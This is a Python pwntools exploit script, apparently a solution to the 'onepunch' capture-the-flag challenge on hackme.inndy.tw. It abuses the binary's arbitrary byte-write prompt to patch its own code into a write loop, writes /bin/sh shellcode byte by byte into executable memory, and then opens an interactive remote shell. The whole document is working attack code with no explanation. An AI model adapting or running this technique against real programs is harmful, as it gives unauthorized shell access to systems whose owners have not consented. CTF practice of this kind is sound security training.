from pwn import *
context(os="linux", arch="amd64",log_level = "debug")

ip ="hackme.inndy.tw"#hackme.inndy.tw 
if ip:
    p = remote(ip,7718)
else:
    p = process("./onepunch")#, aslr=0

elf = ELF("./onepunch")
libc = ELF("./libc-2.23.so.x86_64")
#libc = elf.libc
#-------------------------------------
def sl(s):
    p.sendline(s)
def sd(s):
    p.send(s)
def rc(timeout=0):
    if timeout == 0:
        return p.recv()
    else:
        return p.recv(timeout=timeout)
def ru(s, timeout=0):
    if timeout == 0:
        return p.recvuntil(s)
    else:
        return p.recvuntil(s, timeout=timeout)
def debug(msg=''):
    gdb.attach(p,'')
    pause()
def getshell():
    p.interactive()
#-------------------------------------

shell = 0x400790
ru("Where What?")
sl("0x400768")
sl("137")
shellcode = asm(shellcraft.sh())
shell_len = len(shellcode)

i=0
while i<shell_len:
    ru("Where What?")
    sl(str(hex(shell+i)))
    sl(str(ord(shellcode[i])))
    i+=1

ru("Where What?")
sl("0x400768")
sl("39")

getshell()